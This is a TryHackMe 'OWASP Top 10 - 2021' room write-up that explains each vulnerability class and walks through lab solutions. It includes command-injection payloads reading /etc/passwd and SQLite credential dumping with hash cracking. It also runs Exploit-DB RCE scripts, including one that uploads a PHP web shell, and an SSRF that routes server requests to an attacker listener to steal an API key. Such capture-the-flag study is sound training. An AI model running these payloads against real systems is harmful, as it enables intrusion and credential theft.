---
title: "TryHackMe: OWASP Top 10 - 2021"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_owasp_top_10_2021/
image:
  path: room_img.png
description: "Learn about and exploit each of the OWASP Top 10 vulnerabilities; the 10 most critical web security risks."
---
# OWASP Top 10 - 2021

Created: May 24, 2025 12:58 AM
Status: Not started

### This room breaks each OWASP topic down and includes details on the vulnerabilities, how they occur, and how you can exploit them. You will put the theory into practice by completing supporting challenges.

1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)

## 1. Broken Access Control

### **Definition:**

Broken access control happens when a website does not properly limit what users can see or do. This lets attackers **access pages or actions they shouldn't be allowed to.**

**Example:**

A normal user accessing the **admin page** or viewing **private data** of other users.

**Impact:**

- View sensitive information
- Perform unauthorized actions
- Bypass security restrictions

### **Real Case:**

In 2019, a vulnerability in YouTube let someone get **frames** from private videos. This broke users' trust in privacy controls.

### **Summary:**

Broken access control is dangerous because it lets attackers **act like admins** or **see private content** by skipping the rules that should stop them.

## 2. Broken Access Control (IDOR Challenge)

## **Definition:**

IDOR is a type of **access control vulnerability** where a user can access data or actions just by changing a reference like an **ID in the URL**.

**Example:**

A bank website shows your account at:

`https://bank.thm/account?id=111111`

If you change `id=111111` to `id=222222` and see **another user's account**, that's an IDOR vulnerability.

### **Why it happens:**

The app **does not check** if the logged-in user is **authorized** to access the object (e.g., account 222222).

**Impact:**

- View or edit other users’ data
- Steal sensitive information
- Bypass security rules

**Key point:**

The problem is **not** using IDs directly, but **failing to verify ownership** or permission.

## 3. 🔐 Cryptographic Failures

### **Definition:**

Cryptographic failures happen when an app **fails to properly protect sensitive data** using encryption, or doesn't use encryption at all.

### 🔑 Key Concepts:

- **Data in Transit:**
    
    Data moving between your browser and the server must be encrypted (e.g. using HTTPS).
    
- **Data at Rest:**
    
    Data stored on servers (like emails or passwords) should also be encrypted.
    

### ⚠️ What Can Go Wrong:

- Using **no encryption**
- Using **weak or outdated algorithms**
- Storing passwords **in plain text**
- Failing to **encrypt sensitive user data**

### 🧠 Example:

If a web app stores your email or password **without encryption**, a hacker who gains access to the server or network can easily **read or steal** your data.

### 💥 Attack Example:

In a **Man-in-the-Middle (MitM)** attack, a hacker intercepts traffic between you and a website. If the data isn't encrypted or is poorly encrypted, the hacker can **read everything**.

**Summary:**

Cryptographic failures expose **private user data**. Always use **strong, up-to-date encryption** and protect both **stored data** and **data in transit**.

## 4. Cryptographic Failures (Supporting Material 1)

### 🗃️ Flat-File Databases (Like SQLite)

### 📘 What Is It?

- A **database** is a way to store and organize a **large amount of data**.
- Flat-file databases (like **SQLite**) are saved as a **single file** (e.g. `example.db`).
- They're often used in **small web apps** because they're easy to set up.

### 🌐 Problem in Web Apps

If the `.db` file is stored **under the website root folder**, like this:

```
https://website.com/database/example.db

```

Anyone can **download the file**, open it, and see **all the data**, including:

- Names
- Passwords
- Credit card numbers
    
    ➡️ This leads to **Sensitive Data Exposure**!
    

### 🛠️ How to Open & Query SQLite Database

### Step-by-Step on Linux:

1. **Check the file:**

```bash
file example.db

```

1. **Open the database:**

```bash
sqlite3 example.db

```

1. **See the tables:**

```sql
.tables

```

1. **See table structure:**

```sql
PRAGMA table_info(users);

```

1. **Dump all data:**

```sql
SELECT * FROM users;

```

### 🧾 Example Output:

```
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99

```

This means:

- `custID` = 0
- `custName` = Joy Paulson
- `creditCard` = 4916 9012 2231 7905
- `password` = (a **hashed** password)

Next, you’ll **crack the password hash** 🔓

Let me know if you want help understanding what the hash is or how to crack it with tools like **hashcat** or **CrackStation**.

## 5. Cryptographic Failures (Supporting Material 2)

### 🔓 Cracking Weak Password Hashes (Short Summary)

- We found **MD5 password hashes** in the SQLite database.
- We'll use an **online tool called [CrackStation](https://crackstation.net/)** to crack them.
- It uses a huge **wordlist** to match known passwords to their hash.

### 🧪 Example:

- Hash: `5f4dcc3b5aa765d61d8327deb882cf99`
- Paste it into CrackStation, solve the captcha, and click **"Crack Hashes"**
- Result: `password` (this is the original password)

### ⚠️ Notes:

- CrackStation works only for **weak** or **common** passwords.
- If a password is **not in the wordlist**, it **won’t crack**.
- In this challenge, all crackable hashes are **weak MD5** ones.

## 6. Cryptographic Failures (Challenge)

![Screenshot From 2025-05-24 01-33-10.png](img1.png)

![Screenshot From 2025-05-24 01-36-09.png](img2.png)

### looking the back code we can see the image is came from the folder /assets/image… so we can FFUF too

![Screenshot From 2025-05-24 01-36-56.png](img3.png)

### download the webapp.db open it with sqlite3

```jsx
└─$ sqlite3 webapp.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> 
```

![Screenshot From 2025-05-24 01-55-47.png](img4.png)

![Screenshot From 2025-05-24 01-57-10.png](img5.png)

## **7. Injection**

### **Definition:**

Injection flaws happen when apps treat user input as commands or code. The most common types are:

- **SQL Injection**: Attacker manipulates SQL queries to read, change, or delete database data.
- **Command Injection**: Attacker injects system commands to run on the server.

**To prevent injection attacks:**

- Use **allow lists** to only accept safe input.
- **Strip dangerous characters** from user input.
- Or better: use **security libraries** that handle input validation safely.

## 8. Command Injection

![Screenshot From 2025-05-24 02-24-37.png](img6.png)

```jsx
$(whoami)
$(cat /etc/passwd)
$(awk -F: ‘$3 >= 1000’ /etc/passwd)
[$(cat /etc/os-release)]
```

## 9.  Insecure Design

### try the color green

![Screenshot From 2025-05-24 02-48-15.png](img7.png)

![Screenshot From 2025-05-24 02-41-03.png](img8.png)

![Screenshot From 2025-05-24 02-41-51.png](img9.png)

![Screenshot From 2025-05-24 02-42-09.png](img10.png)

![Screenshot From 2025-05-24 02-42-05.png](img11.png)

## 10. Security Misconfiguration

![Screenshot From 2025-05-24 02-50-05.png](img12.png)

- **`import os`**
    - Brings in Python’s `os` module, which lets you run system commands like from a terminal.
- **`os.popen("cat app.py")`**
    - Runs the command `cat app.py` in the shell.
    - `cat app.py` prints the contents of the file `app.py`.
- **`.read()`**
    - Reads the output of the command (the file’s contents).
- **`print(...)`**
    - Prints the result (the file’s contents) to your screen.

![Screenshot From 2025-05-24 02-51-57.png](img13.png)

## 11. Vulnerable and Outdated Components

Sometimes, companies use old software (like old WordPress versions). If that version has known **vulnerabilities**, attackers can easily find and use public exploits (like from Exploit-DB) to hack them — **without needing a password** or deep skills.

For example:

- WordPress 4.6 has a known **remote code execution (RCE)** bug.
- If it's not updated, hackers can take control of the system easily.

🔒 **Lesson:** Always keep software up to date to avoid known attacks.

## 12. Vulnerable and Outdated Components - Exploit

### 🔍 Exploiting a Known Vulnerability in **Nostromo 1.9.6** (CVE-2019-16278)

### ✅ Step 1: Find the Software & Version

You saw a web page showing:

```
Nostromo version 1.9.6

```

This tells you the server is using **Nostromo 1.9.6**, which has known bugs.

### 🔎 Step 2: Search for an Exploit

You searched **Exploit-DB** for "Nostromo 1.9.6" and found this exploit:

```
CVE-2019-16278
```

You downloaded a Python script: `47837.py`

### ⚠️ Step 3: Run the Exploit – But It Crashed!

```bash
python 47837.py

```

You saw:

```
NameError: name 'cve2019_16278' is not defined

```

🔧 **Fix**: A line in the script `cve2019_16278.py` should be commented with `#`. You did that.

### 🚀 Step 4: Run the Exploit Again

```bash
python2 47837.py 127.0.0.1 80 id

```

You got:

```bash
uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)

```

✅ **BOOM!** You have **Remote Code Execution** — you can now run commands on the server!

### 💡 Key Takeaways:

- If software is outdated, it’s often **already vulnerable**.
- Many public exploits are already written.
- You just need to find the software version and **match it with an existing CVE**.
- Sometimes exploits are buggy — know a little code to fix them.

## Vulnerable and Outdated Components - Lab

![Screenshot From 2025-05-24 04-26-43.png](img14.png)

[https://www.exploit-db.com/exploits/47887](https://www.exploit-db.com/exploits/47887)

```jsx
└─$ python3 47887.py http://10.10.95.2:84/
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.95.2:84/bootstrap/img/p8FFawxJFu.php
> Example command usage: http://10.10.95.2:84/bootstrap/img/p8FFawxJFu.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ ls
android_studio.jpg
beauty_js.jpg
c_14_quick.jpg
c_sharp_6.jpg
doing_good.jpg
img1.jpg
img2.jpg
img3.jpg
kotlin_250x250.png
logic_program.jpg
mobile_app.jpg
p8FFawxJFu.php
pro_asp4.jpg
pro_js.jpg
unnamed.png
web_app_dev.jpg

RCE $ cat /../../opt/flag.txt
THM{But_1ts_n0t_my_f4ult!}

RCE $ 

```

## 13. Identification and Authentication Failures Practical

### nmap scan

```jsx
└─$ nmap -A -p 8088 10.10.95.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 03:01 EDT
Nmap scan report for hi.thm (10.10.95.2)
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
8088/tcp open  http    Apache httpd 2.4.54 ((Unix))
|_http-title: Auth hacks
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Unix)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

TRACEROUTE (using port 8088/tcp)
HOP RTT       ADDRESS
1   157.96 ms 10.8.0.1
2   150.12 ms hi.thm (10.10.95.2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
                   
```

### 💡 What’s a Logic Flaw?

A **logic flaw** happens when a developer makes a mistake in the **rules or logic** of the program, not necessarily in the code syntax.

It’s like saying:

> “The door is locked — but if you knock in a weird way, it opens anyway.”
> 

### 🚨 Vulnerability: Re-registering an Existing User with a Space

Here’s how the flaw works:

1. A valid user like `darren` already exists.
2. The app checks if `darren` exists.
3. You try to register with **" darren"** (with a **space in front**).
4. The app **doesn’t trim the space**, so it sees `" darren"` as a **new username**.
5. But in the backend (like the file system or session), it **still maps to `darren`'s data**, giving you **access to their content** (like a flag, dashboard, or private data).

---

### 🧪 Try This Yourself

Go to this URL:

```
http://10.10.95.2:8088

```

Steps:

1. Try to register with `darren` → you’ll get an error (already exists).
2. Now try to register with `" darren"` (with a space at the beginning).
3. You’ll be **logged in** and able to **see `darren`'s content** (the flag).

### ⚙️ Why Does This Happen?

This flaw happens because the app **doesn’t sanitize input**. It doesn’t:

- Remove spaces (`trim()`),
- Check for duplicates **after cleaning the input**,
- Normalize usernames before storing or comparing them.

### 🔐 How to Fix It (for developers):

- Use `trim()` to remove spaces before checking usernames.
- Convert to lowercase (e.g., `admin`,  `Admin`, and `ADMIN` should all be treated the same).
- Check usernames after **normalization** (cleaning).

### ✅ What You Learn from This:

- Input validation is **very important**.
- Even simple mistakes can cause **serious security issues**.
- Always try **weird inputs** (like spaces, symbols) to test for logic flaws.

![Screenshot From 2025-05-24 03-21-12.png](img15.png)

![1_Jkqbdo4BX0odXedvNgdabw.webp](img16.webp)

## 14. Software and Data Integrity Failures

### 🔐 What Is **Integrity** in Cybersecurity?

**Integrity** means **making sure data is not changed**—either **on purpose by an attacker** or **by accident** (like during download or transfer). It helps us **trust that the data we see or use is exactly what it was supposed to be**.

### 🧪 Simple Example

If you download a file (like an app installer), you want to make sure:

- No one **changed the file** while it was downloading.
- The file didn’t get **damaged or corrupted** in the process.

### ✅ How Do We Check for Integrity?

We use **hashes** (a kind of fingerprint of the file).

### Popular hashing commands on Linux:

```bash
md5sum filename
sha1sum filename
sha256sum filename

```

If the hash you generate **matches the one from the developer**, then the file is safe and unchanged. If not — maybe someone tampered with it or something went wrong.

### 💥 What Are Software and Data Integrity Failures?

If an app or system **does not check for integrity**, then attackers can:

### 1. **Software Integrity Failure**

- The system **runs or installs programs without checking** if they were changed.
- Example: Someone uploads a **malicious update**, and the system runs it because there's **no signature or hash check**.

### 2. **Data Integrity Failure**

- The system **uses files or inputs that can be changed by users or attackers**, without checking if they were modified.
- Example: A form or file upload that accepts **data directly** without validating it.

### 📌 Summary:

| 🔑 Term | 💬 Meaning |
| --- | --- |
| **Integrity** | Making sure data is not changed or corrupted |
| **Hash** | A fingerprint of a file, used to detect changes |
| **Software Integrity Failure** | Running unverified or modified software |
| **Data Integrity Failure** | Using unverified or modified data |

## 15. Software Integrity Failures

## What is a Software Integrity Failure?

It happens when your website or app:

- **Uses external software or code** (like JavaScript libraries),
- **Doesn’t verify** if that code has been **modified** or **tampered with**,
- And as a result, **malicious code** can get into your site **without you knowing**.

---

### Real Example: Using jQuery from an External Source

Developers often include jQuery like this:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>

```

This tells the browser:

> “Hey, don’t get jQuery from my server. Just go to code.jquery.com and load it from there.”
> 

This saves space and bandwidth.

### The Risk?

If **code.jquery.com gets hacked**, an attacker can:

- Replace jQuery with **malicious JavaScript**,
- And your website will still load it without warning!
- So **everyone who visits your site** runs the attacker's code.

That’s a **Software Integrity Failure**. Your site trusts external code **without checking if it’s safe**.

## The Fix: Subresource Integrity (SRI)

SRI is like saying:

> “This is the exact fingerprint (hash) of the file I expect. Only run it if the fingerprint matches.”
> 

Here’s the secure version using **SRI**:

```html
<script
  src="https://code.jquery.com/jquery-3.6.1.min.js"
  integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
  crossorigin="anonymous">
</script>

```

Now, the browser checks:

- “Is this the **same file** I’m expecting?”
- If the file has changed **even by 1 character**, it won’t run.

### Tools You Can Use

You can generate this hash easily using:

 [https://www.srihash.org](https://www.srihash.org/)

Just:

1. Upload or paste the JS file content.
2. Get the hash (SHA-256).
3. Add it to your `<script>` tag as shown above.

### Final Advice (as a future cybersecurity pro!):

- **Always verify third-party code** (especially when hosted on external servers).
- Use SRI in production websites.
- Avoid blindly trusting CDNs or external scripts — they can be compromised.

![Screenshot From 2025-05-24 03-32-30.png](img17.png)

## 16. Data Integrity Failures

![Screenshot From 2025-05-24 04-13-34.png](img18.png)

![Screenshot From 2025-05-24 04-12-47.png](img19.png)

## 16. Server-Side Request Forgery (SSRF)

### 1. **What is the only host allowed to access the admin area?**

When you try to open the Admin Area, you’ll get a message that access is denied unless you're “localhost.” That means only the machine itself can access the admin panel.

**Answer:** `localhost`

### 2. **Where does the server parameter point to in the download resume button?**

If you look closely at the bottom of the page or inspect the “Download Resume” button, you’ll find a parameter in the URL like this:

`server=secure-file-storage.com`

That shows where the server is trying to connect to for the file.

**Answer:** `secure-file-storage.com`

### 3. **Using SSRF, make the request go to your own machine (AttackBox). Does it reveal any API key?**

You need to trick the server into connecting to your own IP by editing the link to replace the original server with your own attack box IP.

- First, open a listener on your machine:
    
    ```
    nc -lvnp 8087
    
    ```
    
- Then, modify the URL like this:
    
    ```
    http://MACHINE_IP:8087/download?server=http://YOUR_ATTACK_BOX_IP:8087&id=75482342
    
    ```
    

After you visit the modified URL, check your terminal. You’ll see a request come in from the server, and inside that request, there will be an API key.

**Answer:** `THM{Hello_Im_just_an_API_key}`

### 4. **Can you use SSRF to access the admin page?**

Yes, you can. Since only `localhost` is allowed to access the admin page, you can make the server request it by itself.

But there’s a trick. You have to encode the `#` symbol so the link doesn’t break. Normally, the server sees `id=` and thinks it’s part of the link, so we encode `#` as `%23`.

Use this modified URL:

```
http://MACHINE_IP:8087/download?server=http://localhost:8087/admin%23&id=75482342

```

That tells the app to connect to its own `/admin` page. When it does, it should return some kind of flag or secret from the admin area. That’s how you bypass the restriction and access the admin area using SSRF.
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
